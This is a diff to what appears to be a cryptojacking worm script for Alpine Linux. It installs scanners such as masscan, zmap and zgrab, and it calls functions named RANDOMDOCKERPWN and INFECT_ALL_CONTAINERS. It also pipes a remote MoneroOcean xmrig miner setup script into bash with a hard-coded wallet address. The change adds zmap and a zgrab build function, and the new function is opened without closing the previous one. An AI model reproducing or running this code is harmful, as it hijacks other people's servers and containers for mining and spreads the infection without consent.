@@ -13,19 +13,24 @@ function SETUP_SYSTEM(){
     apk update || { echo "APK update failed"; exit 1; }
     apk add --no-cache --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing hwloc-dev || { echo "Failed to install hwloc-dev"; exit 1; }
 
-    BASIC_APK_PACKS=(go git jq masscan libpcap libpcap-dev docker make cmake upx libstdc++ gcc g++ libuv-dev iptables openssl openssl-dev hwloc-dev)
+    BASIC_APK_PACKS=(go git jq masscan libpcap zmap libpcap-dev docker make cmake upx libstdc++ gcc g++ libuv-dev iptables openssl openssl-dev hwloc-dev)
     for BASIC_APK_PACK in "${BASIC_APK_PACKS[@]}"; do
         echo "Installing: $BASIC_APK_PACK"
         apk add --no-cache "$BASIC_APK_PACK" >/dev/null 2>&1 || { echo "Failed to install $BASIC_APK_PACK"; exit 1; }
         sleep "$SETUP_SLEEP"
     done
     
-    mkdir -p /root/go/src/github.com/zmap/zgrab
-    go install github.com/zmap/zgrab@latest
-    cd /root/go/src/github.com/zmap/zgrab
-    go build
-    cp ./zgrab /usr/bin/zgrab
-    chmod +x /usr/bin/zgrab
+function SETUP_ZGRAB(){
+apk update
+apk add git go gcc make musl-dev libpcap-dev linux-headers
+export GOPATH=/root/go
+go get github.com/zmap/zgrab
+cd /root/go/src/github.com/zmap/zgrab/
+go build
+cp ./zgrab /usr/bin/zgrab
+chmod +x /usr/bin/zgrab
+}
+
     # Clean APK cache
     rm -rf /var/cache/apk/*
 
@@ -95,6 +100,7 @@ function RANDOMDOCKERPWN(){
 }
 
 SETUP_SYSTEM
+SETUP_ZGRAB
 export HOME=/root
 curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 4AYe7ZbZEAMezv8jVqnagtWz24nA8dkcPaqHa8p8MLpqZvcWJSk7umPNhDuoXM2KRXfoCB7N2w2ZTLmTPj5GgoTvBipk1s9
 INFECT_ALL_CONTAINERS
